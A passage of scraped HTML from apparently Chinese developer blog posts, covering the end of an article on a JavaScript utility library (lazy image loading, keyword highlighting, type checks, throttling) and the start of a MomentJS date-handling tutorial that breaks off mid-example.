class=\"hljs-keyword\">function</span> (obj, url, errorUrl,cb) {\n    var oImg = new Image(), _this = this;\n    oImg.src = url;\n    oImg.onload = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        obj.src = oImg.src;\n        <span class=\"hljs-keyword\">if</span> (cb &amp;&amp; _this.istype(cb, <span class=\"hljs-string\">'function'</span>)) {\n            cb(obj);\n        }\n    }\n    oImg.onerror=<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        obj.src=errorUrl;\n        <span class=\"hljs-keyword\">if</span> (cb &amp;&amp; _this.istype(cb, <span class=\"hljs-string\">'function'</span>)) {\n            cb(obj);\n        }\n    }\n},\n//图片滚动懒加载\n//@className {string} 要遍历图片的类名\n//@num {number} 距离多少的时候开始加载 默认 0\n//比如，一张图片距离文档顶部3000，num参数设置200，那么在页面滚动到2800的时候，图片加载。不传num参数就滚动，num默认是0，页面滚动到3000就加载\n//html代码\n//&lt;p&gt;&lt;img data-src=<span class=\"hljs-string\">\"https://user-gold-cdn.xitu.io/2017/12/7/160319f12631736f\"</span> class=<span class=\"hljs-string\">\"load-img\"</span> width=<span class=\"hljs-string\">'528'</span> height=<span class=\"hljs-string\">'304'</span> /&gt;&lt;/p&gt;\n//&lt;p&gt;&lt;img data-src=<span class=\"hljs-string\">\"https://user-gold-cdn.xitu.io/2017/12/7/160319f12631736f\"</span> class=<span class=\"hljs-string\">\"load-img\"</span> width=<span class=\"hljs-string\">'528'</span> height=<span class=\"hljs-string\">'304'</span> /&gt;&lt;/p&gt;\n//&lt;p&gt;&lt;img data-src=<span class=\"hljs-string\">\"https://user-gold-cdn.xitu.io/2017/12/7/160319f12631736f\"</span> class=<span class=\"hljs-string\">\"load-img\"</span> width=<span class=\"hljs-string\">'528'</span> height=<span class=\"hljs-string\">'304'</span> /&gt;&lt;/p&gt;....\n//data-src储存src的数据，到需要加载的时候把data-src的值赋值给src属性，图片就会加载。\n//详细可以查看<span class=\"hljs-built_in\">test</span>LoadImg.html\n//window.onload = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>() {\n//    loadImg(<span class=\"hljs-string\">'load-img'</span>,100);\n//    window.onscroll = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>() {\n//        ecDo.loadImg(<span class=\"hljs-string\">'load-img'</span>,100);\n//        }\n//}\nloadImg: <span class=\"hljs-keyword\">function</span> (className, num, errorUrl) {\n    var _className = className || <span class=\"hljs-string\">'ec-load-img'</span>, _num = num || 0, _this = this,_errorUrl=errorUrl||null;\n    var oImgLoad = document.getElementsByClassName(_className);\n    <span class=\"hljs-keyword\">for</span> (var i = 0, len = oImgLoad.length; i &lt; len; i++) {\n        //如果图片已经滚动到指定的高度\n        <span class=\"hljs-keyword\">if</span> (document.documentElement.clientHeight + document.documentElement.scrollTop &gt; oImgLoad[i].offsetTop - _num &amp;&amp; !oImgLoad[i].isLoad) {\n            //记录图片是否已经加载\n            oImgLoad[i].isLoad = <span class=\"hljs-literal\">true</span>;\n            //设置过渡，当图片下来的时候有一个图片透明度变化\n            oImgLoad[i].style.cssText = <span class=\"hljs-string\">\"transition: ''; opacity: 0;\"</span>\n            <span class=\"hljs-keyword\">if</span> (oImgLoad[i].dataset) {\n                this.aftLoadImg(oImgLoad[i], oImgLoad[i].dataset.src, _errorUrl, <span class=\"hljs-keyword\">function</span> (o) {\n                    //添加定时器，确保图片已经加载完了，再把图片指定的的class，清掉，避免重复编辑\n                    <span class=\"hljs-built_in\">set</span>Timeout(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n                        <span class=\"hljs-keyword\">if</span> (o.isLoad) {\n                            _this.removeClass(o, _className);\n                            o.style.cssText = <span class=\"hljs-string\">\"\"</span>;\n                        }\n                    }, 1000)\n                });\n            } <span class=\"hljs-keyword\">else</span> {\n                this.aftLoadImg(oImgLoad[i], oImgLoad[i].getAttribute(<span class=\"hljs-string\">\"data-src\"</span>), _errorUrl, <span class=\"hljs-keyword\">function</span> (o) {\n                    //添加定时器，确保图片已经加载完了，再把图片指定的的class，清掉，避免重复编辑\n                    <span class=\"hljs-built_in\">set</span>Timeout(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n                        <span class=\"hljs-keyword\">if</span> (o.isLoad) {\n                            _this.removeClass(o, _className);\n                            o.style.cssText = <span class=\"hljs-string\">\"\"</span>;\n                        }\n                    }, 1000)\n                });\n            }\n            (<span class=\"hljs-keyword\">function</span> (i) {\n                <span class=\"hljs-built_in\">set</span>Timeout(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n                    oImgLoad[i].style.cssText = <span class=\"hljs-string\">\"transition:all 1s; opacity: 1;\"</span>;\n                }, 16)\n            })(i);\n        }\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-49\">5-11关键词加标签&nbsp;</h3>\n<pre class=\"hljs bash\"><code>//这两个函数多用于搜索的时候，关键词高亮\n//创建正则字符\n//ecDo.createKeyExp([前端，过来])\n//result:(前端|过来)/g\ncreateKeyExp: <span class=\"hljs-keyword\">function</span> (strArr) {\n    var str = <span class=\"hljs-string\">\"\"</span>;\n    <span class=\"hljs-keyword\">for</span> (var i = 0; i &lt; strArr.length; i++) {\n        <span class=\"hljs-keyword\">if</span> (i != strArr.length - 1) {\n            str = str + strArr[i] + <span class=\"hljs-string\">\"|\"</span>;\n        } <span class=\"hljs-keyword\">else</span> {\n            str = str + strArr[i];\n        }\n    }\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-string\">\"(\"</span> + str + <span class=\"hljs-string\">\")\"</span>;\n},\n//关键字加标签（多个关键词用空格隔开）\n//ecDo.findKey(<span class=\"hljs-string\">'守侯我oaks接到了来自下次你离开快乐吉祥留在开城侯'</span>,<span class=\"hljs-string\">'守侯 开'</span>,<span class=\"hljs-string\">'i'</span>)\n//<span class=\"hljs-string\">\"&lt;i&gt;守侯&lt;/i&gt;我oaks接到了来自下次你离&lt;i&gt;开&lt;/i&gt;快乐吉祥留在&lt;i&gt;开&lt;/i&gt;城侯\"</span>\nfindKey: <span class=\"hljs-keyword\">function</span> (str, key, el) {\n    var arr = null,\n        regStr = null,\n        content = null,\n        Reg = null,\n        _el = el || <span class=\"hljs-string\">'span'</span>;\n    arr = key.split(/\\s+/);\n    //alert(regStr); //    如：(前端|过来)\n    regStr = this.createKeyExp(arr);\n    content = str;\n    //alert(Reg);//        /如：(前端|过来)/g\n    Reg = new RegExp(regStr, <span class=\"hljs-string\">\"g\"</span>);\n    //过滤html标签 替换标签，往关键字前后加上标签\n    content = content.replace(/&lt;\\/?[^&gt;]*&gt;/g, <span class=\"hljs-string\">''</span>)\n    <span class=\"hljs-built_in\">return</span> content.replace(Reg, <span class=\"hljs-string\">\"&lt;\"</span> + _el + <span class=\"hljs-string\">\"&gt;<span class=\"hljs-variable\">$1</span>&lt;/\"</span> + _el + <span class=\"hljs-string\">\"&gt;\"</span>);\n}\n</code></pre>\n<h3 data-id=\"heading-50\">5-12数据类型判断&nbsp;</h3>\n<pre class=\"hljs bash\"><code>//ecDo.istype([],<span class=\"hljs-string\">'array'</span>)\n//<span class=\"hljs-literal\">true</span>\n//ecDo.istype([])\n//<span class=\"hljs-string\">'[object Array]'</span>\nistype: <span class=\"hljs-keyword\">function</span> (o, <span class=\"hljs-built_in\">type</span>) {\n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">type</span>) {\n        var _type = type.toLowerCase();\n    }\n    switch (_type) {\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'string'</span>:\n            <span class=\"hljs-built_in\">return</span> Object.prototype.toString.call(o) === <span class=\"hljs-string\">'[object String]'</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'number'</span>:\n            <span class=\"hljs-built_in\">return</span> Object.prototype.toString.call(o) === <span class=\"hljs-string\">'[object Number]'</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'boolean'</span>:\n            <span class=\"hljs-built_in\">return</span> Object.prototype.toString.call(o) === <span class=\"hljs-string\">'[object Boolean]'</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'undefined'</span>:\n            <span class=\"hljs-built_in\">return</span> Object.prototype.toString.call(o) === <span class=\"hljs-string\">'[object Undefined]'</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'null'</span>:\n            <span class=\"hljs-built_in\">return</span> Object.prototype.toString.call(o) === <span class=\"hljs-string\">'[object Null]'</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'function'</span>:\n            <span class=\"hljs-built_in\">return</span> Object.prototype.toString.call(o) === <span class=\"hljs-string\">'[object Function]'</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'array'</span>:\n            <span class=\"hljs-built_in\">return</span> Object.prototype.toString.call(o) === <span class=\"hljs-string\">'[object Array]'</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'object'</span>:\n            <span class=\"hljs-built_in\">return</span> Object.prototype.toString.call(o) === <span class=\"hljs-string\">'[object Object]'</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'nan'</span>:\n            <span class=\"hljs-built_in\">return</span> isNaN(o);\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'elements'</span>:\n            <span class=\"hljs-built_in\">return</span> Object.prototype.toString.call(o).indexOf(<span class=\"hljs-string\">'HTML'</span>) !== -1\n        default:\n            <span class=\"hljs-built_in\">return</span> Object.prototype.toString.call(o)\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-51\">5-13手机类型判断</h3>\n<pre class=\"hljs bash\"><code>browserInfo: <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-built_in\">type</span>) {\n    switch (<span class=\"hljs-built_in\">type</span>) {\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'android'</span>:\n            <span class=\"hljs-built_in\">return</span> navigator.userAgent.toLowerCase().indexOf(<span class=\"hljs-string\">'android'</span>) !== -1\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'iphone'</span>:\n            <span class=\"hljs-built_in\">return</span> navigator.userAgent.toLowerCase().indexOf(<span class=\"hljs-string\">'iphone'</span>) !== -1\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'ipad'</span>:\n            <span class=\"hljs-built_in\">return</span> navigator.userAgent.toLowerCase().indexOf(<span class=\"hljs-string\">'ipad'</span>) !== -1\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'weixin'</span>:\n            <span class=\"hljs-built_in\">return</span> navigator.userAgent.toLowerCase().indexOf(<span class=\"hljs-string\">'micromessenger'</span>) !== -1\n        default:\n            <span class=\"hljs-built_in\">return</span> navigator.userAgent.toLowerCase()\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-52\">5-14函数节流</h3>\n<pre class=\"hljs bash\"><code>//多用于鼠标滚动，移动，窗口大小改变等高频率触发事件\n// var count=0;\n// <span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">fn1</span></span>(){\n//     count++;\n//     console.log(count)\n// }\n// //100ms内连续触发的调用，后一个调用会把前一个调用的等待处理掉，但每隔200ms至少执行一次\n// document.onmousemove=ecDo.delayFn(fn1,100,200)\ndelayFn: <span class=\"hljs-keyword\">function</span> (fn, delay, mustDelay) {\n    var timer = null;\n    var t_start;\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        var context = this, args = arguments, t_cur = +new Date();\n        //先清理上一次的调用触发（上一次调用触发事件不执行）\n        clearTimeout(timer);\n        //如果不存触发时间，那么当前的时间就是触发时间\n        <span class=\"hljs-keyword\">if</span> (!t_start) {\n            t_start = t_cur;\n        }\n        //如果当前时间-触发时间大于最大的间隔时间（mustDelay），触发一次函数运行函数\n        <span class=\"hljs-keyword\">if</span> (t_cur - t_start &gt;= mustDelay) {\n            fn.apply(context, args);\n            t_start = t_cur;\n        }\n        //否则延迟执行\n        <span class=\"hljs-keyword\">else</span> {\n            timer = <span class=\"hljs-built_in\">set</span>Timeout(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n                fn.apply(context, args);\n            }, delay);\n        }\n    };\n}\n</code></pre>\n<h2 data-id=\"heading-53\">6.封装成形</h2>\n<blockquote>\n  <p>可能有小伙伴会有疑问，这样封装，调用有点麻烦，为什么不直接在原型上面封装，调用方便。比如下面的栗子！</p>\n</blockquote>\n<pre class=\"hljs bash\"><code>String.prototype.trim=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-built_in\">type</span>){\n    switch (<span class=\"hljs-built_in\">type</span>){\n        <span class=\"hljs-keyword\">case</span> 1:<span class=\"hljs-built_in\">return</span> this.replace(/\\s+/g,<span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-keyword\">case</span> 2:<span class=\"hljs-built_in\">return</span> this.replace(/(^\\s*)|(\\s*$)/g, <span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-keyword\">case</span> 3:<span class=\"hljs-built_in\">return</span> this.replace(/(^\\s*)/g, <span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-keyword\">case</span> 4:<span class=\"hljs-built_in\">return</span> this.replace(/(\\s*$)/g, <span class=\"hljs-string\">\"\"</span>);\n        default:<span class=\"hljs-built_in\">return</span> this;\n    }\n}\n//<span class=\"hljs-string\">'  12345 6 8 96  '</span>.trim(1)\n//<span class=\"hljs-string\">\"123456896\"</span>\n//比这样trim(<span class=\"hljs-string\">'  12345 6 8 96  '</span>,1)调用方便。\n//但是，这样是不推荐的做法，这样就污染了原生对象String,别人创建的String也会被污染，造成不必要的开销。\n//更可怕的是，万一自己命名的跟原生的方法重名了，就被覆盖原来的方法了\n//String.prototype.substr=<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>(){console.log(<span class=\"hljs-string\">'asdasd'</span>)}  \n//<span class=\"hljs-string\">'asdasdwe46546'</span>.substr()\n//asdasd \n//substr方法有什么作用，大家应该知道，不知道的可以去w3c看下\n</code></pre>\n<p>所以在原生对象原型的修改很不推荐！至少很多的公司禁止这样操作！</p>\n<p>所以建议的封装姿势是</p>\n<pre class=\"hljs bash\"><code>var ecDo={\n    trim:<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>(){..},\n    changeCase:<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>(){..}...\n}\n</code></pre>\n<h2 data-id=\"heading-54\">7.小结</h2>\n<p>这篇文章，写了很久了，几个小时了，因为我写这篇文章，我也是重新改我以前代码的，因为我以前写的代码，功能一样，代码比较多，现在是边想边改边写，还要自己测试（之前的代码for循环很多，现在有很多简洁的写法代替）。加上最近公司比较忙，所以这一篇文章也是花了几天才整理完成。<br>源码都放在github上了，大家想以后以后有什么修改或者增加的，欢迎大家来star一下<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FchenhuiYj%2Fec-do\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ec-do</a>。<br>我自己封装这个，并不是我有造轮子的习惯，而是：</p>\n<p>1，都是一些常用，但是零散的小实例，网上基本没有插件。</p>\n<p>2，因为零散的小实例，涉及到的有字符串，数组，对象等类型，就算找到插件，在项目引入的很有可能不止一个插件。</p>\n<p>3.都是简单的代码，封装也不难。维护也简单。</p>\n<p>其他的不多说了，上面的只是我自己在开发中常用到，希望能帮到小伙伴们，最理想就是这篇文章能起到一个 <b><code>抛砖引玉</code></b> 的作用，就是说，如果觉得还有什么操作是常用的，或者觉得我哪里写得不好的，也欢迎指出，让大家相互帮助，相互学习。</p><p><br></p><p><br></p><p>-------------------------华丽的分割线--------------------<br>想了解更多，关注关注我的微信公众号：守候书阁</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d33b27d3f303a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"258\" data-height=\"258\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;258&quot; height=&quot;258&quot;&gt;&lt;/svg&gt;\"></p></div><p><br></p></div>"},{"title":"JS时间处理插件MomentJS","avatar":"https://user-gold-cdn.xitu.io/2017/12/9/1603b5820ac466ee?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"谢小飞","create_time":"2017 年 12 月 09 日","tags":["JavaScript","前端","jQuery"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>笔者在做项目的时候，需要对日期和时间进行一些处理和操作，但是每次都用JS自带的Date对象很不方便，还要写一堆繁琐的代码，后续维护起来也很痛苦。在网上找了一下JS处理日期和时间的插件，发现了MomentJS很好用，学习了一下它的语法，发现十分的简洁易懂，而且可扩展性很强，调用方法灵活。很多的方法调用形式多样，支持多种传参数方式。下面简单的整理了一下使用方式</p>\n<h1 class=\"heading\" data-id=\"heading-0\">构造Moment对象</h1>\n<p>MomentJS将时间封装成一个对象，moment对象，这个对象很多种构造方式，可以支持传入字符串、数组和对象的形式来构造。</p>\n<h2 class=\"heading\" data-id=\"heading-1\">当前系统时间</h2>\n<p>如果什么都不传，就获取当前的系统时间。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">var now = moment()\n</code></pre><h2 class=\"heading\" data-id=\"heading-2\">字符串构造</h2>\n<p>可以传入字符串，首先会检查字符串的格式是否符合<code>ISO 8601</code>的格式，如果不符合，就调用<code>new Date(string)</code>来构造。</p>\n<h3 class=\"heading\" data-id=\"heading-3\">已知格式字符串</h3>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">'2017-01-02'</span>);               //年月日\nmoment(<span class=\"hljs-string\">'2017-01-02 13'</span>);            //年月日 小时\nmoment(<span class=\"hljs-string\">'2017-01-02 13:12'</span>);         //年月日 小时分钟\nmoment(<span class=\"hljs-string\">'2017-01-02 13:12:52'</span>);      //年月日 小时分钟秒\nmoment(<span class=\"hljs-string\">'2017-01-02 13:12:52.123'</span>);  //年月日 小时分钟秒 毫秒\n</code></pre><h3 class=\"heading\" data-id=\"heading-4\">字符串+格式</h3>\n<p>假如日期的格式不符合<code>ISO 8601</code>的格式，但是你知道输入的字符串的格式，也可以通过这种方式解析，解析的语法有以下四种格式：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(String, String);\nmoment(String, String, String);\nmoment(String, String, Boolean);\nmoment(String, String, String, Boolean);\n</code></pre><p>第一种已知某个时间的格式，将格式作为第二个参数传入</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">'12-25-1995 12/43/53'</span>, <span class=\"hljs-string\">'MM-DD-YYYY HH/mm/ss'</span>)\n</code></pre><p>格式字母代表的含义如下表</p>\n<table>\n<thead>\n<tr>\n<th>Input</th>\n<th>Example</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>YYYY</td>\n<td>2014</td>\n<td>4位数年份</td>\n</tr>\n<tr>\n<td>YY</td>\n<td>14</td>\n<td>2位数年份</td>\n</tr>\n<tr>\n<td>Q</td>\n<td>1..4</td>\n<td>季度，将月份设置成季度的第一个月</td>\n</tr>\n<tr>\n<td>M MM</td>\n<td>1..12</td>\n<td>月份</td>\n</tr>\n<tr>\n<td>MMM MMMM</td>\n<td>Jan..December</td>\n<td>月份名称</td>\n</tr>\n<tr>\n<td>D DD</td>\n<td>1..31</td>\n<td>一个月的第几天</td>\n</tr>\n<tr>\n<td>DDD DDDD</td>\n<td>1..365</td>\n<td>一年的第几天</td>\n</tr>\n<tr>\n<td>H HH</td>\n<td>0..23</td>\n<td>24小时制</td>\n</tr>\n<tr>\n<td>h hh</td>\n<td>1..12</td>\n<td>12小时制</td>\n</tr>\n<tr>\n<td>m mm</td>\n<td>0..59</td>\n<td>分钟</td>\n</tr>\n<tr>\n<td>s ss</td>\n<td>0..59</td>\n<td>秒</td>\n</tr>\n</tbody>\n</table>\n<p>第二种，可以将当地区域的关键符作为第三个参数传入。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">'2012 juillet'</span>, <span class=\"hljs-string\">'YYYY MMM'</span>, <span class=\"hljs-string\">'fr'</span>);\nmoment(<span class=\"hljs-string\">'2012 July'</span>,    <span class=\"hljs-string\">'YYYY MMM'</span>, <span class=\"hljs-string\">'en'</span>);\n</code></pre><p>MomentJS的匹配模式是十分宽松的，并且可能会导致一些我们不想要的行为。从<code>2.3.0</code>版本开始，我们可以在最后传入一个布尔值来让Moment使用严格模式匹配。严格模式要求输入的字符串和格式要完全相同。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">'It is 2012-05-25'</span>, <span class=\"hljs-string\">'YYYY-MM-DD'</span>).isValid();       // <span class=\"hljs-literal\">true</span>\nmoment(<span class=\"hljs-string\">'It is 2012-05-25'</span>, <span class=\"hljs-string\">'YYYY-MM-DD'</span>, <span class=\"hljs-literal\">true</span>).isValid(); // <span class=\"hljs-literal\">false</span>\nmoment(<span class=\"hljs-string\">'2012-05-25'</span>,       <span class=\"hljs-string\">'YYYY-MM-DD'</span>, <span class=\"hljs-literal\">true</span>).isValid(); // <span class=\"hljs-literal\">true</span>\n</code></pre><h3 class=\"heading\" data-id=\"heading-5\">字符串+多格式</h3>\n<p>假如你不知道输入的字符串确切是用的哪种格式，但是知道是某些格式中的一种，可以将多种格式用数组的形式传入，将会以最先匹配到的格式为输出结果。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">\"12-25-1995\"</span>, [<span class=\"hljs-string\">\"MM-DD-YYYY\"</span>, <span class=\"hljs-string\">\"YYYY-MM-DD\"</span>]);\n</code></pre><h2 class=\"heading\" data-id=\"heading-6\">对象</h2>\n<p>我们也可以通过传入一个对象的形式来创建moment对象，传入的对象中包括一些时间单位的属性。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment({ y    :2010, M     :3, d   :5, h    :15, m      :10, s      :3, ms          :123});\nmoment({ year :2010, month :3, day :5, hour :15, minute :10, second :3, millisecond :123});\nmoment({ years:2010, months:3, days:5, hours:15, minutes:10, seconds:3, milliseconds:123});\nmoment({ years:2010, months:3, date:5, hours:15, minutes:10, seconds:3, milliseconds:123});\n</code></pre><p>上面代码中的day和date都表示当前月的第几天。</p>\n<h3 class=\"heading\" data-id=\"heading-7\">Date 对象</h3>\n<p>我们也可以传入JS原生的Date对象来创建moment对象。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">var day = new Date(2011, 9, 16);\nvar dayWrapper = moment(day);\n</code></pre><h2 class=\"heading\" data-id=\"heading-8\">数组</h2>\n<p>我们可以传入一个数字的数组来创建moment对象，数组中每个每个数字代表的含义如下：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">// [年, 月, 日, 时, 分, 秒, 毫秒]\nmoment([2010, 1, 14, 15, 25, 50, 125]);\n//2010年2月14日15时25分50秒125毫秒\n</code></pre><p>需要注意的是：数组中的月、时、分、秒、毫秒都是从0开始的，而年和日都是从1开始的。</p>\n<h1 class=\"heading\" data-id=\"heading-9\">取值and赋值</h1>\n<p>MomentJS使用可以重载的get和set方法，跟我们以前在jQuery中的形式很相似。我们可以调用这些方法不传参数作来获取，传入参数作来设置。</p>\n<h2 class=\"heading\" data-id=\"heading-10\">自带函数</h2>\n<p>获取或者设置毫秒，设置的范围0到999</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().millisecond(Number);\nmoment().millisecond(); // Number\nmoment().milliseconds(Number);\nmoment().milliseconds(); // Number\n</code></pre><p>获取或者设置秒，设置的范围0到59</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().second(Number);\nmoment().second(); // Number\nmoment().seconds(Number);\nmoment().seconds(); // Number\n</code></pre><p>获取或者设置分钟，设置的范围0到59</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().minute(Number);\nmoment().minute(); // Number\nmoment().minutes(Number);\nmoment().minutes(); // Number\n</code></pre><p>获取或者设置小时，设置的范围0到23</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().hour(Number);\nmoment().hour(); // Number\nmoment().hours(Number);\nmoment().hours(); // Number\n</code></pre><p>获取或者设置日期，设置的范围1到31</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().date(Number);\nmoment().date(); // Number\nmoment().dates(Number);\nmoment().dates(); // Number\n</code></pre><p>获取或者设置星期，设置的范围0（周日）到6（周六）</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().day(Number|String);\nmoment().day(); // Number\nmoment().days(Number|String);\nmoment().days(); // Number\n</code></pre><p>获取或者设置一年中的天数，设置的范围1到366</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().dayOfYear(Number);\nmoment().dayOfYear(); // Number\n</code></pre><p>获取或者设置一年中的周</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().week(Number);\nmoment().week(); // Number\nmoment().weeks(Number);\nmoment().weeks(); // Number\n</code></pre><p>获取或者设置一年中的月份，设置的范围0到11</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().month(Number|String);\nmoment().month(); // Number\nmoment().months(Number|String);\nmoment().months(); // Number\n</code></pre><p>获取或者设置季度，设置的范围1到4</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().quarter(); // Number\nmoment().quarter(Number);\n</code></pre><p>获取或者设置年，设置的范围-270000到270000</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().year(Number);\nmoment().year(); // Number\nmoment().years(Number);\nmoment().years(); // Number\n</code></pre><h2 class=\"heading\" data-id=\"heading-11\">取值and赋值函数</h2>\n<p>除了上面的这么多函数外，MomentJS还有一个用来统一取值和赋值的函数，get和set。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().get(<span class=\"hljs-string\">'year'</span>);\nmoment().get(<span class=\"hljs-string\">'month'</span>);  // 0 to 11\nmoment().get(<span class=\"hljs-string\">'date'</span>);\nmoment().get(<span class=\"hljs-string\">'hour'</span>);\nmoment().get(<span class=\"hljs-string\">'minute'</span>);\nmoment().get(<span class=\"hljs-string\">'second'</span>);\nmoment().get(<span class=\"hljs-string\">'millisecond'</span>);\n</code></pre><p>set函数接收单位作为第一个参数，单位的值作为第二个参数。如果要设置多个值的话，也可以通过传入一个对象。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().set(<span class=\"hljs-string\">'year'</span>, 2013);\nmoment().set(<span class=\"hljs-string\">'month'</span>, 3); //四月\nmoment().set(<span class=\"hljs-string\">'date'</span>, 1);\nmoment().set(<span class=\"hljs-string\">'hour'</span>, 13);\nmoment().set(<span class=\"hljs-string\">'minute'</span>, 20);\nmoment().set(<span class=\"hljs-string\">'second'</span>, 30);\nmoment().set(<span class=\"hljs-string\">'millisecond'</span>, 123);\n\nmoment().set({<span class=\"hljs-string\">'year'</span>: 2013, <span class=\"hljs-string\">'month'</span>: 3});\n</code></pre><h2 class=\"heading\" data-id=\"heading-12\">max/min函数</h2>\n<p>max函数可以返回给定的moment对象中最大的实例，也就是最靠近未来的实例。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">var a = moment(<span class=\"hljs-string\">'2017-12-01'</span>);\nvar b = moment(<span class=\"hljs-string\">'2017-12-06'</span>);\nmoment.max(a, b);  // b\n</code></pre><p>min函数可以返回给定的moment对象中最小的实例，也就是最靠近过去的实例。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">var a = moment(<span class=\"hljs-string\">'2017-12-01'</span>);\nvar b = moment(<span class=\"hljs-string\">'2017-12-06'</span>);\nmoment.min(a, b);  // a\n</code></pre><h1 class=\"heading\" data-id=\"heading-13\">操作</h1>\n<p>有时候，我们需要对时间进行一系列的操作，最常见的就是加减计算。MomentJS提供了很多方法给我们来进行调用。\n　　MomentJS使用的模式跟jQuery相似，都是使用的函数的链式调用，可以让我们将操作链式执行下去，代码如下所示：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment()\n  .add(7, <span class=\"hljs-string\">'days'</span>)\n  .subtract(1, <span class=\"hljs-string\">'months'</span>)\n  .year(2009)\n  .hours(0)\n  .minutes(0)\n  .seconds(0);\n</code></pre><h2 class=\"heading\" data-id=\"heading-14\">add加法</h2>\n<p>add函数让我们把Moment对象的时间往后退，它的语法如下：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().add(Number, String);\nmoment().add(Duration);\nmoment().add(Object);\n</code></pre><p>我们可以传入想要的增加的时间数量和时间单位，比如要往后推迟7天：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().add(7, <span class=\"hljs-string\">'days'</span>);\n</code></pre><p>当然，add函数也允许我们提供时间单位的缩写：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().add(7, <span 